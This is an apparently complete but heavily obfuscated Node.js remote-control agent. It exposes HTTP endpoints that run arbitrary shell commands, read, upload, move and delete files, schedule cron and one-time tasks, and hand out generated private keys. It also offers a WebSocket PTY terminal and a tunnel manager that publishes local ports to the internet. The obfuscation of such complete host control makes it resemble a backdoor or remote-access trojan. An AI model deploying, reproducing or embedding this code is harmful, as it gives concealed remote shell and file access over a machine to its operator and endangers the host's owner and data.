            let c = Buffer[fT(0x664)](JSON[fT(0x823)]({
                'type': b[fT(0xdd)],
                'shell': a0aT[fT(0x774)](a),
                'path': a,
                'incognito': !!(this[fT(0x5cb)] && a0aT[fT(0x508)](a))
            }));
            this[fT(0xb1)] && this['cipher'] && this['cipher'][fT(0x1a0)] && (c = this[fT(0x7fa)][fT(0x5a8)](c)), this['websocket'] && this[fT(0xfe)][fT(0x169)] === 0x1 && this[fT(0xfe)]['send'](c);
        } catch (d) {
        }
    }
    [a0aY(0x821)](a) {
        const fU = a0aY, b = {
                'Rejll': fU(0x770),
                'OcrHf': fU(0x453),
                'njrBa': function (c, d) {
                    return c === d;
                },
                'ynWNQ': fU(0x4e5),
                'yPHIG': fU(0x196),
                'VpYZQ': fU(0x2df)
            };
        if (!this[fU(0x757)])
            return;
        try {
            const c = Buffer[fU(0x664)](a);
            let d;
            this[fU(0xb1)] ? d = this[fU(0x7fa)][fU(0x6f0)](c) : d = c;
            let f = ![], g = d[fU(0xec)](b[fU(0x25d)]);
            if (g['trim']()[fU(0x315)]('{'))
                try {
                    const h = JSON['parse'](g);
                    f = !![];
                    if (h['type'] === b[fU(0x5b0)]) {
                        let i = Buffer[fU(0x664)](JSON[fU(0x823)]({ 'type': b[fU(0x5b0)] }));
                        if (this['useNoise'])
                            i = this['cipher'][fU(0x5a8)](i);
                        this['websocket'][fU(0x597)](i);
                        return;
                    }
                    if (b[fU(0x2b8)](h[fU(0x565)], b[fU(0x4b1)])) {
                        this['ptyProcess']['resize'](h[fU(0x55d)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (h[fU(0x565)] === b['yPHIG'] && h[fU(0x54a)] !== undefined) {
                        let j = h[fU(0x200)] === b['VpYZQ'] ? Buffer[fU(0x664)](h[fU(0x54a)], fU(0x2df))[fU(0xec)](b['Rejll']) : h[fU(0x54a)];
                        this[fU(0x757)][fU(0x81f)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[fU(0x757)][fU(0x81f)](d[fU(0xec)](fU(0x770)));
        } catch (l) {
            a0D[fU(0x554)]('[终端会话\x20' + this[fU(0x482)] + fU(0x1aa) + l[fU(0x5a9)]);
            if (this[fU(0xb1)])
                this['cleanup']();
        }
    }
}
async function a0aU() {
    const fV = a0aY, a = { 'qmkzd': fV(0x193) }, b = await import(fV(0xb7));
    a0A = b['p256'];
    const c = await import(a['qmkzd']);
    a0B = c[fV(0x288)];
}
async function a0aV(a = {}) {
    const fW = a0aY, b = {
            'wKXex': fW(0x628),
            'fQnoA': fW(0x318),
            'KZDLk': fW(0x524),
            'NQsvU': fW(0x28b),
            'LdBeZ': 'Access-Control-Expose-Headers',
            'ypmqL': fW(0x7da),
            'SrXYd': function (c, d) {
                return c === d;
            },
            'wVehw': 'x-encrypted',
            'JISCH': fW(0x2ea),
            'MVptu': function (c) {
                return c();
            },
            'UWsvA': fW(0x81e),
            'LUiIo': fW(0x617),
            'TWsbp': function (c, d) {
                return c / d;
            },
            'svfQu': function (c, d) {
                return c > d;
            },
            'CYvDq': '📦\x20[Cache]\x20BaseInfo\x20命中有效缓存，直接输出。',
            'CRmKX': function (c, d, f) {
                return c(d, f);
            },
            'btygY': function (c, d) {
                return c < d;
            },
            'Vumoq': function (c, d) {
                return c > d;
            },
            'BDHqo': 'string',
            'kOAlR': 'full',
            'rPDQI': fW(0x703),
            'qFjek': function (c, d) {
                return c(d);
            },
            'ANwia': function (c, d) {
                return c(d);
            },
            'TFUhB': 'short',
            'rqbDd': function (c, d) {
                return c === d;
            },
            'baqio': fW(0x71f),
            'iXVqk': function (c, d) {
                return c / d;
            },
            'kjruN': fW(0x314),
            'oGLnF': fW(0x1c6),
            'VHeAP': function (c, d) {
                return c === d;
            },
            'gzkzt': fW(0x1fe),
            'vvFwZ': 'cmd\x20required',
            'SZWsY': function (c, d) {
                return c === d;
            },
            'tdEHp': function (c, d) {
                return c(d);
            },
            'rUwnS': function (c, d) {
                return c(d);
            },
            'ehLjY': fW(0x5db),
            'WNGdh': fW(0x725),
            'ElGgP': fW(0x580),
            'VOUoX': fW(0x4ac),
            'rEjjI': function (c, d) {
                return c !== d;
            },
            'eaAVz': function (c, d) {
                return c(d);
            },
            'nZKuW': fW(0x671),
            'RTJNs': fW(0x796),
            'jgKsk': 'content-type',
            'NtUaU': 'application/octet-stream',
            'LBXYd': fW(0x7de),
            'KJqOD': 'items\x20required\x20(non-empty\x20array)',
            'UIhfp': function (c, d) {
                return c !== d;
            },
            'DSczB': function (c, d, f) {
                return c(d, f);
            },
            'gKgHd': function (c, d) {
                return c(d);
            },
            'pTfVq': function (c, d) {
                return c === d;
            },
            'CLoxJ': function (c, d) {
                return c(d);
            },
            'qBxGe': function (c, d) {
                return c < d;
            },
            'fRzFB': fW(0x814),
            'fFTNE': function (c, d) {
                return c === d;
            },
            'ohHQZ': function (c, d) {
                return c < d;
            },
            'GDsum': function (c, d) {
                return c ?? d;
            },
            'PyZhz': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'XDhMa': fW(0xf9),
            'cvdcK': fW(0x3ce),
            'wYvkN': fW(0x6da),
            'WdulT': fW(0x691),
            'DoqbZ': 'Shutting\x20down...',
            'cPqfu': fW(0x75e),
            'Duzkm': fW(0x2ef),
            'SqJBg': fW(0x47e),
            'dondg': fW(0xfa),
            'pCdAN': fW(0x64c),
            'oySyo': fW(0x2ed),
            'Isqjr': fW(0x2d6),
            'BUVHJ': fW(0x69c),
            'KIYKz': fW(0x4c4),
            'NMSda': fW(0x6bc),
            'Msmat': function (c) {
                return c();
            },
            'WsnXb': function (c, d) {
                return c(d);
            },
            'uozqt': fW(0x6b6),
            'PYsPK': fW(0x79b),
            'gFHAO': fW(0x3f7),
            'mCeGa': fW(0x6cb),
            'VQUsd': '/api/tempkey',
            'kaYQs': fW(0x4a2),
            'Wshwr': fW(0x47b),
            'hxxZR': fW(0x53e),
            'QTyFU': '/api/file/list',
            'JujOD': fW(0x3f0),
            'BDbvl': fW(0x1cf),
            'PmaES': '/api/fileraw',
            'qEvpA': fW(0x831),
            'bhCEC': fW(0x417),
            'XjSOJ': fW(0x119),
            'Lfztf': fW(0x23c),
            'CXBOM': '/api/task/onetime',
            'PfWwD': '/api/task/cron',
            'ADmRh': '/api/task/status',
            'UIyWW': fW(0x255),
            'RCZId': fW(0x1af),
            'tSwoL': fW(0x127),
            'kaHWo': fW(0x5f6),
            'FHDAy': fW(0x6b4),
            'NEDJE': fW(0x28d),
            'kFnjM': fW(0x232),
            'MUgmH': fW(0x58f),
            'eQWat': fW(0x7d4),
            'ypLkG': fW(0x431)
        };
    try {
        await b[fW(0x4ec)](a0aU), a0D[fW(0x4a6)](b['cPqfu']), a0P[fW(0x52d)](a), a0D['debug']('Validating\x20config...'), a0P['validate'](), a0D[fW(0x4a6)](b['Duzkm']), a0D[fW(0x4a6)](b[fW(0x740)]);
        const c = new a0R(a0P[fW(0x439)], a0P[fW(0x48c)]);
        a0D[fW(0x4a6)](b[fW(0x195)]);
        !a0P[fW(0x55a)] && !c[fW(0x5fa)] && (a0D[fW(0x1c6)](b[fW(0x844)]), a0D[fW(0x1c6)](b[fW(0xea)]), process[fW(0x205)](0x1));
        a0D[fW(0x4a6)](b[fW(0x4da)]);
        const d = new a0Q();
        d[fW(0x351)] = () => a0P[fW(0x4fd)](), a0D[fW(0x4a6)](b[fW(0x32f)]), a0D[fW(0x4a6)](fW(0x56d));
        const f = new a0U();
        a0D[fW(0x4a6)](b[fW(0x395)]), a0D[fW(0x4a6)](b[fW(0x5b5)]);
        const g = b['Msmat'](a0f);
        b[fW(0x58a)](a0x, g), a0D['debug'](b[fW(0x3dc)]), g['use']((l, m, n) => {
            const fX = fW;
            m['header'](b[fX(0x2a9)], '*'), m['header'](fX(0x756), b[fX(0x280)]), m['header'](b[fX(0x145)], b[fX(0x1b3)]), m['header'](b[fX(0x246)], b['ypmqL']);
            if (b[fX(0x79f)](l[fX(0x57b)], fX(0xc6)))
                return a0P['DEBUG'] && m[fX(0x39b)](b[fX(0x4bb)], b[fX(0x1bc)]), m[fX(0x75d)](0xc8)[fX(0x581)]();
            b[fX(0x4ec)](n);
        }), g[fW(0x471)](a0f[fW(0x5ee)]({
            'type': l => l[fW(0x7d7)] !== fW(0x38f),
            'limit': b['PYsPK']
        })), g[fW(0x471)](a0f['urlencoded']({ 'extended': !![] })), g['use'](a0T(c, d)), a0D[fW(0x4a6)](b['gFHAO']), g[fW(0x7dd)](b[fW(0x5a0)], async (l, m) => {
            const fY = fW;
            try {
                const n = Math[fY(0x15d)](b[fY(0xc8)](Date[fY(0x4b6)](), 0x3e8));
                !a0P['_baseinfo_cache'] || b['svfQu'](n - a0P[fY(0xf7)], a0P[fY(0x717)]) ? (!a0P[fY(0x3c3)] && (a0P[fY(0x3c3)] = f[fY(0x7b0)]()[fY(0x607)](p => {
                    const fZ = fY, q = b[fZ(0x48d)][fZ(0x493)]('|');
                    let r = 0x0;
                    while (!![]) {
                        switch (q[r++]) {
                        case '0':
                            a0D[fZ(0x4a6)](b[fZ(0x711)]);
                            continue;
                        case '1':
                            a0P[fZ(0x162)] = p;
                            continue;
                        case '2':
                            a0P['_baseinfo_cache_time'] = Math[fZ(0x15d)](Date[fZ(0x4b6)]() / 0x3e8);
                            continue;
                        case '3':
                            return p;
                        case '4':
                            a0P[fZ(0x3c3)] = null;
                            continue;
                        }
                        break;
                    }
                })[fY(0x521)](p => {
                    const g0 = fY;
                    a0P[g0(0x3c3)] = null;
                    throw p;
                })), await a0P[fY(0x3c3)]) : a0D[fY(0x4a6)](b[fY(0x80e)]);
                const o = { ...a0P[fY(0x162)] };
                b[fY(0x79f)](l['is_authenticated'], !![]) ? (o['session_key'] = a0P[fY(0x3bb)], o[fY(0x245)] = a0P[fY(0x42b)]) : (o[fY(0x275)] = null, o[fY(0x245)] = null), m['json'](o), b[fY(0x79f)](a0P[fY(0x6c0)], '1') && a0aN[fY(0x76f)]();
            } catch (p) {
                m['status'](0x1f4)[fY(0x41f)]({
                    'status': fY(0x1c6),
                    'message': p['message']
                });
            }
        }), g[fW(0x7dd)](b[fW(0x77a)], (l, m) => {
            const g1 = fW;
            let n = a0P[g1(0x3b2)];
            if (l['query']['ttl'] !== undefined) {
                const s = b['CRmKX'](parseInt, l[g1(0x7c8)][g1(0x22d)], 0xa);
                if (Number[g1(0x697)](s) || b[g1(0x69a)](s, 0x1) || b[g1(0x46b)](s, a0P['TEMPKEY_MAX_TTL_HOURS']))
                    return m[g1(0x75d)](0x1a6)[g1(0x41f)]({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0P[g1(0x594)] });
                n = s;
            }
            const o = b[g1(0x79f)](typeof l[g1(0x7c8)][g1(0x624)], b['BDHqo']) ? l[g1(0x7c8)]['format'][g1(0x450)]()['toLowerCase']() : '';
            let p;
            if (o === '' || b['SrXYd'](o, g1(0x61a)))
                p = b[g1(0x1c4)];
            else {
                if (b[g1(0x79f)](o, g1(0x64b)))
                    p = g1(0x64b);
                else
                    return m['status'](0x1a6)[g1(0x41f)]({ 'error': b[g1(0x7bf)] });
            }
            const q = d[g1(0x251)](n), r = u => new Date(u * 0x3e8)[g1(0x2e6)]()[g1(0xed)](g1(0x81d), 'Z');
            m[g1(0x41f)]({
                'status': 'ok',
                'key_id': q[g1(0x6e9)],
                'ttl_seconds': q[g1(0x1d3)],
                'created_at': b[g1(0x1ea)](r, q[g1(0x743)]),
                'expires_at': b[g1(0x1bf)](r, q[g1(0x4cb)]),
                'ecdsa': p === b[g1(0x742)] ? {
                    'private_key': q[g1(0x807)],
                    'public_key': q[g1(0x716)]
                } : {
                    'private_key': q[g1(0x621)][g1(0x450)](),
                    'public_key': q['ecdsa_public_key'][g1(0x450)]()
                },
                'ecies': b['rqbDd'](p, b[g1(0x742)]) ? {
                    'private_key': q[g1(0x826)],
                    'public_key': q[g1(0x7f6)]
                } : {
                    'private_key': q[g1(0x826)],
                    'public_key': q[g1(0x704)]
                }
            });
        }), g[fW(0x7dd)](b[fW(0x2f1)], async (l, m) => {
            const g2 = fW, n = { 'ynyKy': b[g2(0x222)] };
            try {
                const o = Math[g2(0x15d)](b['iXVqk'](Date[g2(0x4b6)](), 0x3e8));
                !a0P['_status_cache'] || b['Vumoq'](o - a0P[g2(0x646)], a0P[g2(0x2bf)]) ? (!a0P[g2(0x4bc)] && (a0P[g2(0x4bc)] = f[g2(0x72b)]()[g2(0x607)](q => {
                    const g3 = g2;
                    return a0P[g3(0x676)] = q, a0P[g3(0x646)] = Math[g3(0x15d)](Date[g3(0x4b6)]() / 0x3e8), a0P[g3(0x4bc)] = null, a0D[g3(0x4a6)](n[g3(0x744)]), q;
                })['catch'](q => {
                    const g4 = g2;
                    a0P[g4(0x4bc)] = null;
                    throw q;
                })), await a0P['_status_fetch_promise']) : a0D[g2(0x4a6)](b[g2(0x1a1)]);
                const p = { ...a0P[g2(0x676)] };
                m[g2(0x41f)](p);
            } catch (q) {
                m[g2(0x75d)](0x1f4)[g2(0x41f)]({
                    'status': b[g2(0x5dc)],
                    'message': q[g2(0x5a9)]
                });
            }
        });
        const h = async (l, m) => {
            const g5 = fW;
            try {
                let n = null;
                if (typeof l[g5(0x3dd)] === 'string')
                    n = l[g5(0x3dd)][g5(0x450)]();
                else
                    l[g5(0x3dd)] && b[g5(0x19b)](typeof l[g5(0x3dd)], b['gzkzt']) && (n = l['body'][g5(0x5eb)] || '');
                if (!n)
                    return m[g5(0x75d)](0x190)[g5(0x41f)]({
                        'status': b[g5(0x5dc)],
                        'message': b[g5(0x215)]
                    });
                const o = await a0V[g5(0x698)](n, {
                    'cwd': l[g5(0x3dd)]['cwd'],
                    'env': l[g5(0x3dd)][g5(0x30f)],
                    'timeout': a0P[g5(0x5f1)]
                });
                m['json'](o);
            } catch (p) {
                m[g5(0x75d)](0x1f4)[g5(0x41f)]({
                    'status': b[g5(0x5dc)],
                    'message': p[g5(0x5a9)]
                });
            }
        };
        g[fW(0x15f)](b[fW(0x77d)], h);
        for (const l of [
                '/api/do',
                b[fW(0x413)],
                '/api/work'
            ]) {
            g[fW(0x15f)](l, h);
        }
        g['post'](b[fW(0x6f7)], async (m, n) => {
            const g6 = fW;
            try {
                const o = await a0Y[g6(0x7a5)](m[g6(0x3dd)][g6(0x7d7)], m[g6(0x3dd)][g6(0x428)]);
                n[g6(0x41f)]({
                    'status': 'ok',
                    'count': o[g6(0x7bc)],
                    'files': o
                });
            } catch (p) {
                n[g6(0x75d)](0x1f4)['json']({
                    'status': b[g6(0x5dc)],
                    'message': p[g6(0x5a9)]
                });
            }
        }), g['post'](b['JujOD'], async (m, n) => {
            const g7 = fW;
            try {
                const o = await a0Y[g7(0x51f)](m['body'][g7(0x36c)] || []);
                n[g7(0x41f)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[g7(0x75d)](0x1f4)[g7(0x41f)]({
                    'status': 'error',
                    'message': p[g7(0x5a9)]
                });
            }
        }), g[fW(0x2a3)](b['JujOD'], async (m, n) => {
            const g8 = fW;
            try {
                const o = m[g8(0x3dd)][g8(0x5d4)] || {}, p = b[g8(0x5fd)](m[g8(0x3dd)][g8(0x428)], !![]), q = await a0Y[g8(0x2f8)](o, p);
                n['json'](q);
            } catch (r) {
                n[g8(0x75d)](0x1f4)[g8(0x41f)]({
                    'status': b[g8(0x5dc)],
                    'message': r[g8(0x5a9)]
                });
            }
        }), g[fW(0x15f)](fW(0x768), async (m, n) => {
            const g9 = fW;
            try {
                const o = await a0Y[g9(0x1f4)](m[g9(0x3dd)][g9(0x7d7)]);
                n['json'](o);
            } catch (p) {
                n[g9(0x75d)](0x1f4)[g9(0x41f)]({
                    'status': b[g9(0x5dc)],
                    'message': p['message']
                });
            }
        }), g[fW(0x15f)](b[fW(0x1c1)], async (m, n) => {
            const ga = fW;
            try {
                const o = await a0Y[ga(0x710)](m['body'][ga(0x7d7)], m[ga(0x3dd)][ga(0x257)], m[ga(0x3dd)][ga(0x29b)], m[ga(0x3dd)][ga(0x3cd)], m[ga(0x3dd)][ga(0x1cc)]);
                n[ga(0x41f)](o);
            } catch (p) {
                n[ga(0x75d)](0x1f4)[ga(0x41f)]({
                    'status': b[ga(0x5dc)],
                    'message': p['message']
                });
            }
        }), g[fW(0x15f)](b[fW(0x17d)], a0f[fW(0x487)]({
            'type': b[fW(0x76a)],
            'limit': b['PYsPK']
        }), async (m, n) => {
            const gb = fW;
            try {
                const o = b[gb(0x3a4)](decodeURIComponent, m[gb(0xce)][gb(0x726)] || ''), p = b[gb(0x3ad)](decodeURIComponent, m[gb(0xce)][b['ehLjY']] || ''), q = m['headers'][b[gb(0x3c9)]], r = m[gb(0xce)][b[gb(0x4ff)]];
                if (!o || !p)
                    return n[gb(0x75d)](0x190)[gb(0x41f)]({
                        'status': b[gb(0x5dc)],
                        'completed': ![],
                        'message': b[gb(0x1f1)]
                    });
                const s = b[gb(0x531)](q, undefined) ? parseInt(b['eaAVz'](String, q), 0xa) : null, t = b[gb(0x531)](r, undefined) ? parseInt(b[gb(0x1ea)](String, r), 0xa) : null, u = m['body'];
                if (!Buffer['isBuffer'](u))
                    return n[gb(0x75d)](0x190)[gb(0x41f)]({
                        'status': b[gb(0x5dc)],
                        'completed': ![],
                        'message': gb(0x1b5)
                    });
                const v = await a0Y['uploadFileRaw'](o, p, u, s, t);
                n[gb(0x41f)](v);
            } catch (w) {
                n[gb(0x75d)](0x1f4)[gb(0x41f)]({
                    'status': gb(0x1c6),
                    'completed': ![],
                    'message': w[gb(0x5a9)]
                });
            }
        }), g[fW(0x15f)](b['qEvpA'], async (m, n) => {
            const gc = fW;
            try {
                const o = await a0Y[gc(0x26a)](m[gc(0x3dd)][gc(0x7d7)]);
                return n[gc(0x39b)](b[gc(0x187)], o[gc(0x540)][gc(0xec)]()), n[gc(0x39b)](b[gc(0x723)], o['path']), n[gc(0x39b)](b[gc(0x249)], b[gc(0x76a)]), n[gc(0x597)](o[gc(0x29b)]);
            } catch (p) {
                n[gc(0x75d)](0x1f4)['json']({
                    'status': b[gc(0x5dc)],
                    'message': p[gc(0x5a9)]
                });
            }
        }), g[fW(0xfd)](fW(0x1cf), async (m, n) => {
            const gd = fW;
            try {
                let o = m[gd(0x3dd)][gd(0x36c)];
                if (!o || !Array[gd(0x1a7)](o)) {
                    o = [];
                    if (m['body'][gd(0x7d7)])
                        o[gd(0x560)](m[gd(0x3dd)][gd(0x7d7)]);
                    if (m[gd(0x3dd)][gd(0x3ab)])
                        o[gd(0x560)](m['body'][gd(0x3ab)]);
                }
                const p = await a0Y['deleteFiles'](o);
                n[gd(0x41f)]({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[gd(0x41f)]({
                    'status': 'error',
                    'message': q[gd(0x5a9)]
                });
            }
        }), g[fW(0x2a3)](b[fW(0x1c1)], async (m, n) => {
            const ge = fW;
            try {
                const o = await a0Y['moveFiles'](m[ge(0x3dd)][ge(0x384)] || m[ge(0x3dd)]);
                n[ge(0x41f)]({
                    'status': 'ok',
                    'total': o[ge(0x7bc)],
                    'success': o[ge(0xfb)](p => p['status'] === 'ok')[ge(0x7bc)],
                    'results': o
                });
            } catch (p) {
                n[ge(0x75d)](0x1f4)[ge(0x41f)]({
                    'status': b[ge(0x5dc)],
                    'message': p[ge(0x5a9)]
                });
            }
        }), g['post'](b['bhCEC'], async (m, n) => {
            const gf = fW;
            try {
                const o = await a0Y[gf(0x449)](m[gf(0x3dd)]);
                n[gf(0x41f)]({
                    'status': 'ok',
                    'total': o[gf(0x7bc)],
                    'success': o[gf(0xfb)](p => p[gf(0x75d)] === 'ok')[gf(0x7bc)],
                    'results': o
                });
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[gf(0x5dc)],
                    'message': p['message']
                });
            }
        }), g['post'](fW(0x602), async (m, n) => {
            const gg = fW;
            try {
                const o = await a0Y[gg(0x423)](m[gg(0x3dd)]['path']);
                n[gg(0x41f)](o);
            } catch (p) {
                n[gg(0x75d)](0x1f4)['json']({
                    'status': b[gg(0x5dc)],
                    'message': p[gg(0x5a9)]
                });
            }
        }), g[fW(0x15f)](b[fW(0x848)], async (m, n) => {
            const gh = fW;
            try {
                const o = m[gh(0x3dd)] || {};
                if (!o['path'])
                    return n['status'](0x190)[gh(0x41f)]({ 'error': b[gh(0x544)] });
                if (!Array[gh(0x1a7)](o['items']) || b[gh(0x19b)](o[gh(0x9a)]['length'], 0x0))
                    return n[gh(0x75d)](0x190)[gh(0x41f)]({ 'error': b['KJqOD'] });
                const p = await a0Y[gh(0x6b7)](o[gh(0x7d7)], o[gh(0x9a)], !!o[gh(0x392)]);
                n[gh(0x41f)](p);
            } catch (q) {
                const r = /Access denied/[gh(0x75b)](q[gh(0x5a9)]) ? 0x193 : 0x190;
                n[gh(0x75d)](r)[gh(0x41f)]({
                    'status': b[gh(0x5dc)],
                    'message': q[gh(0x5a9)]
                });
            }
        }), g[fW(0x15f)](b['Lfztf'], async (m, n) => {
            const gi = fW;
            try {
                const o = m['body'] || {};
                if (!o[gi(0x7d7)])
                    return n['status'](0x190)[gi(0x41f)]({ 'error': 'path\x20required' });
                const p = await a0Y[gi(0x661)](o['path'], o[gi(0x3d3)], b[gi(0x14a)](o[gi(0x21d)], ![]), Array[gi(0x1a7)](o[gi(0x2b2)]) ? o['entries'] : null);
                n['json'](p);
            } catch (q) {
                const r = /Access denied/[gi(0x75b)](q[gi(0x5a9)]) ? 0x193 : 0x190;
                n[gi(0x75d)](r)[gi(0x41f)]({
                    'status': gi(0x1c6),
                    'message': q[gi(0x5a9)]
                });
            }
        }), g[fW(0x7dd)](b[fW(0x3b8)], (m, n) => {
            const gj = fW;
            n[gj(0x41f)](a0a0[gj(0x50d)]());
        }), g[fW(0x15f)](fW(0x3da), async (m, n) => {
            const gk = fW;
            try {
                const o = await a0a0['setOnetimeTasks'](m[gk(0x3dd)]);
                n[gk(0x41f)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[gk(0x5dc)],
                    'message': p['message']
                });
            }
        }), g[fW(0x7dd)](b[fW(0x2cb)], (m, n) => {
            const gl = fW;
            n[gl(0x41f)](a0a0[gl(0x391)]());
        }), g[fW(0x15f)](b[fW(0x2cb)], (m, n) => {
            const gm = fW;
            try {
                const o = a0a0[gm(0xa7)](m['body']);
                n[gm(0x41f)](o);
            } catch (p) {
                n[gm(0x75d)](0x1f4)[gm(0x41f)]({
                    'status': b[gm(0x5dc)],
                    'message': p[gm(0x5a9)]
                });
            }
        }), g[fW(0x7dd)](b['ADmRh'], (m, n) => {
            const gn = fW;
            n[gn(0x41f)](a0a0[gn(0x367)]());
        }), g['get'](b['UIyWW'], (m, n) => {
            const go = fW;
            let o = b[go(0x58e)](parseInt, m[go(0x7c8)][go(0x690)], 0xa) || 0x32;
            o = Math['min'](Math['max'](o, 0x1), 0x64), n[go(0x41f)](a0a0[go(0x135)](o));
        }), g[fW(0x7dd)](b[fW(0x61c)], (m, n) => {
            const gp = fW;
            let o = b[gp(0xef)](parseInt, m[gp(0x7c8)]['limit'], 0xa) || 0x32;
            o = Math[gp(0x6ab)](Math[gp(0x217)](o, 0x1), 0x64), n[gp(0x41f)](a0a0[gp(0x497)](o));
        }), g['delete'](b[fW(0x7ff)], (m, n) => {
            const gq = fW;
            n[gq(0x41f)](a0a0['clearOnetimeLogs']());
        }), g[fW(0xfd)](b[fW(0x61c)], (m, n) => {
            const gr = fW;
            n[gr(0x41f)](a0a0[gr(0x2a1)]());
        }), g[fW(0x7dd)](fW(0x694), (m, n) => {
            const gs = fW;
            n[gs(0x41f)](a0a0[gs(0xfc)]());
        }), g[fW(0x15f)](b['tSwoL'], async (m, n) => {
            const gt = fW;
            try {
                const o = await a0a0[gt(0x65f)]();
                n[gt(0x41f)](o);
            } catch (p) {
                n[gt(0x75d)](0x1f4)[gt(0x41f)]({
                    'status': b['oGLnF'],
                    'message': p['message']
                });
            }
        });
        const i = {
                'debug': (...m) => a0D['debug'](m['join']('\x20')),
                'info': (...m) => a0D[fW(0x554)](m[fW(0x16d)]('\x20')),
                'warning': (...m) => a0D[fW(0x10d)](m[fW(0x16d)]('\x20'))
            }, j = new a0aM(i);
        g[fW(0x7dd)](b[fW(0x182)], (m, n) => {
            const gu = fW, o = j[gu(0x59b)]();
            n['json']({
                'status': 'ok',
                'count': o[gu(0x7bc)],
                'tunnels': o
            });
        }), g[fW(0x15f)](b[fW(0x182)], async (m, n) => {
            const gv = fW;
            try {
                const o = b[gv(0x3db)](a0aL, m[gv(0x3dd)]);
                let p = o[gv(0x7a9)];
                (b[gv(0x3cc)](p, undefined) || b[gv(0x3cc)](p, null) || b[gv(0x49e)](p, '')) && (p = a0P['PORT']);
                const q = b[gv(0x1eb)](Number, p);
                if (!Number['isInteger'](q) || b[gv(0x139)](q, 0x1) || b[gv(0x46b)](q, 0xffff))
                    return n[gv(0x75d)](0x1a6)[gv(0x41f)]({
                        'status': b[gv(0x5dc)],
                        'created': ![],
                        'port': p,
                        'message': b[gv(0x1bd)]
                    });
                const r = await j[gv(0x552)](q, b[gv(0x479)](o[gv(0x62a)], !![]));
                n['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[gv(0x54c)],
                    'port': r[gv(0x7a9)],
                    'created_at': r[gv(0x154)]
                });
            } catch (s) {
                n[gv(0x75d)](s[gv(0x75d)] || 0x1f4)[gv(0x41f)]({
                    'status': b[gv(0x5dc)],
                    'created': ![],
                    'port': s[gv(0x7a9)] ?? null,
                    'message': s['message']
                });
            }
        }), g[fW(0xfd)](b[fW(0x182)], async (m, n) => {
            const gw = fW;
            try {
                const o = b[gw(0x3ad)](a0aL, m[gw(0x3dd)]), p = o['port'], q = b['qFjek'](Number, p);
                if (b[gw(0x49e)](p, undefined) || p === null || p === '' || !Number[gw(0x653)](q) || b[gw(0x82a)](q, 0x1) || q > 0xffff)
                    return n[gw(0x75d)](0x1a6)[gw(0x41f)]({
                        'status': b[gw(0x5dc)],
                        'deleted': 0x0,
                        'port': b[gw(0x65b)](p, null),
                        'message': b[gw(0x46e)]
                    });
                const r = await j[gw(0x377)](q, o[gw(0x7cd)]);
                if (b['VHeAP'](r[gw(0x75d)], 'ok'))
                    return n[gw(0x41f)]({
                        'status': 'ok',
                        'deleted': r['deleted'],
                        'port': q,
                        'tunnels': r[gw(0x21f)]
                    });
                return n['status'](r[gw(0x75d)])[gw(0x41f)]({
                    'status': b[gw(0x5dc)],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[gw(0x5a9)]
                });
            } catch (s) {
                n[gw(0x75d)](0x1f4)['json']({
                    'status': b['oGLnF'],
                    'deleted': 0x0,
                    'message': s[gw(0x5a9)]
                });
            }
        }), a0D['debug'](b[fW(0x666)]), g['ws'](b['NEDJE'], async (m, n) => {
            const gx = fW, o = n[gx(0x265)][0x0];
            a0D[gx(0x4a6)]('WebSocket\x20request\x20URL:\x20' + n['url']), a0D[gx(0x4a6)](gx(0x78a) + o);
            const p = n[gx(0x7c8)][gx(0x2ec)], q = n[gx(0x7c8)][gx(0x26c)], r = b[gx(0x479)](n[gx(0x7c8)]['meta'], '1'), s = b['SrXYd'](n[gx(0x7c8)][gx(0x72e)], '1');
            a0D[gx(0x4a6)](gx(0x2e1) + p);
            if (!p) {
                a0D[gx(0x4a6)](b['XDhMa']), m[gx(0x233)](0x3f0, b[gx(0x720)]);
                return;
            }
            if (q) {
                const u = a0P[gx(0x73d)](), v = Buffer[gx(0x664)](b[gx(0x43d)](String, q), gx(0x770)), w = Buffer[gx(0x664)](u, gx(0x770)), x = v[gx(0x7bc)] === w[gx(0x7bc)] && a0k['timingSafeEqual'](v, w);
                if (!x) {
                    a0D[gx(0x10d)](gx(0x7a3) + p + gx(0x4fa)), m['close'](0x3f0, b[gx(0x6ea)]);
                    return;
                }
            }
            const t = new a0aT();
            await t['startSession'](m, p, q, r, s);
        }), a0D[fW(0x4a6)](b['kFnjM']), a0a0[fW(0x598)](), a0D[fW(0x4a6)](b[fW(0xcd)]);
        const k = g[fW(0x73f)](a0P[fW(0xe9)], a0P[fW(0x110)], () => {
            const gy = fW;
            a0D[gy(0x4a6)](gy(0x27c) + a0P[gy(0xbd)] + gy(0x346) + a0P['HOST'] + ':' + a0P[gy(0xe9)]), a0D[gy(0x4a6)](b[gy(0x2b9)]), (b['pTfVq'](a0P[gy(0x6c0)], '1') || b[gy(0x79f)](a0P[gy(0x6c0)], '2') && a0aN[gy(0x443)]()) && a0aN[gy(0x80b)](j);
        });
        process['on']('SIGINT', () => {
            const gz = fW;
            a0D[gz(0x4a6)](b[gz(0x673)]), k[gz(0x233)](), process[gz(0x205)](0x0);
        }), a0D[fW(0x4a6)](b[fW(0x470)]);
    } catch (m) {
        a0D[fW(0x1c6)](b[fW(0x67e)], m), process[fW(0x205)](0x1);
    }
}
(require[a0aY(0x659)] === module || require[a0aY(0x659)]?.[a0aY(0x257)]?.[a0aY(0x7a2)](a0aY(0x4b4))) && a0aV()['catch'](a0D[a0aY(0x1c6)]);
module['exports'] = {
    'main': a0aV,
    'loadCurves': a0aU,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0a0,
    'TaskStore': a0Z,
    'ArgoTunnelManager': a0aM,
    'KModeController': a0aN,
    'ZipArchiver': a0X,
    'TempKeyManager': a0Q
};